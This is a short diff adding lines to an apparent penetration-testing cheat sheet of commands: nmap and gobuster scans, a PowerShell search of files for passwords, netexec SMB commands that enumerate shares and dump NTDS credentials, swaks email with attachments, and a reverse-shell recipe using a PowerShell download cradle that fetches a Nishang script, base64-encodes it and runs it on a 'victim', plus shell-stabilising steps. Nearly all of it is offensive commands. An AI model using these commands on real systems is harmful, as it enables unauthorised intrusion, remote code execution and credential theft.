@@ -1,2 +1,19 @@
 sudo nmap -sC -sV -vv -oA <path> <ip>
 sudo vi /etc/hosts: add <ip> <domain>
+gobuster dir -u <domain> -w <wordpath> -o <outfilepath>
+
+scan password from files(windows): gci -recurse -force -include *.txt, *.ini, *.xml, *.cfg | select-string password
+nxc/cme: nxc smb <ip> -u <user> -p <password> --shares(optional) --ntds(optional)
+smtp: swaks -s <smtp ip> -f <from> -t <to> --attach <file>
+
+---------reverse-shell----------------
+<local>
+vi cradle: IEX(new-object net.webclient).downloadstring("rev.ps1")
+cp nishang/InvokePowershell rev.ps1
+cat cradle | iconv -t utf-16le | base64 -w 0; echo -> copy result
+<victim>
+WinExec("<result>")
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo; fg
+export TERM = xterm
